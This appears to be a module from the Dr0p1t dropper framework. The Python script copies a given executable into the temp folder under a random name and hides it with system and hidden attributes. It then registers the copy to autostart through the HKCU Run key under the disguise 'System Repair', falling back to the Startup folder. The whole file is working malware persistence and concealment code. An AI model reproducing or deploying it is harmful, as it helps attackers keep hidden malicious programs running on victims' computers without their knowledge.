#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to startup registry key
#Start

def random_name():
    return "Ss" + str(randint(10,100))

def F4241( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()
    blahah = subprocess.Popen( "attrib +s +h " + new,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE ) #hiding the file

def F7212(exe):
    fp = subprocess.Popen("echo %temp%",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode().strip()
    new_name = random_name()
    new_file_path = fp + "\\" + new_name +".exe"
    F4241( exe,new_file_path )
    #keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        #key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER,winreg.keyVal,0,winreg.KEY_ALL_ACCESS)
        #x1 = winreg.SetValueEx(key2change, "System_Repair",0,winreg.REG_SZ, new_file_path)
        command = 'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "System Repair" /t REG_SZ /f /d "{}"'
        x1 = subprocess.Popen(command.format( new_file_path ) ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    except:
        appdata = subprocess.Popen("echo %APPDATA%",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode().strip()
        x1 = subprocess.Popen('rename "{}" "{}" '.format(new_file_path,appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}".format( new_name +".exe" )),
        shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        #x1 = os.rename( new_file_path, os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}".format( new_name +".exe" ) ) )

F7212(File)
